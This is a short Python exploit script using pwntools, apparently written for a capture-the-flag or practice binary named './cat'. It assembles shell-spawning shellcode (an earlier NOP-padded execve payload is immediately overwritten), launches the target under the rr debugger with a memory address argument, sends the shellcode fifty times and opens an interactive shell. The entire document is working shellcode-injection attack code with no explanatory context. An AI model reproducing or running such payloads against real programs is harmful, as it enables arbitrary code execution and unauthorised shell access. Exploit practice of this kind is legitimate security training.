from pwn import *
context.arch = "amd64"

payload = flat({
    0: asm(shellcraft.execve("/usr/bin/id"))
}, filler=b"\x90", length=1024)
payload = asm(shellcraft.sh())
p = process(["rr", "record", "-n", "./cat", str(0x68000000)])

for _ in range(50):
    p.send(payload)
    p.clean_and_log()

p.interactive()
